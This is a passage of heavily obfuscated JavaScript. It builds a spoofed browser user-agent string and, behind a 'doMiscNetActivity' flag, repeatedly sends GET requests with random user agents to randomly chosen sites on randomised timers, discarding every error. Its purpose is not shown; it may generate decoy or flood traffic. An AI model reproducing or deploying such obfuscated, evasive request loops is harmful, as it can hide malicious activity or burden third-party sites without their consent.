      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1 * 0x2465 + 0x1db3 * -0x1 + -0x2 * 0x359; k < -0xc40 + 0x90d + 0x1 * 0x337; k++)
    setTimeout(f, (-0xb3d * -0x11 + -0x144a3 + 0x16ff6) * k * getRandomInt(0x18a9 + -0x1 * -0x203e + -0x38e6, 0x7a4 + -0x1 * 0x26a9 + 0x52c * 0x6));
  setInterval(() => {
    f();
    for (let l = 0x232a + 0xec9 + 0x13 * -0x2a1; l < 0x98 * 0x7 + 0xa9d + -0xec1; l++)
      setTimeout(f, (0x161f3 + -0x1 * -0x12c1 + -0x27 * 0x38c) * l * getRandomInt(0x300 + -0x4c1 * 0x3 + 0xb44, -0x24b5 + 0x2650 + -0xcc * 0x2));
  }, -0x228a62 + -0x4fb62f * -0x1 + 0x9c2b3 * 0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x1f + 0x1d48 + -0x1d1) * getRandomInt(-0x6 * -0x233 + 0xd * 0x105 + -0x1a72, -0x1 * -0xee6 + -0x30 * 0x70 + -0x61f * -0x1));
}, 0xf4f * -0x1 + -0x4 * -0x7a4 + -0xedd);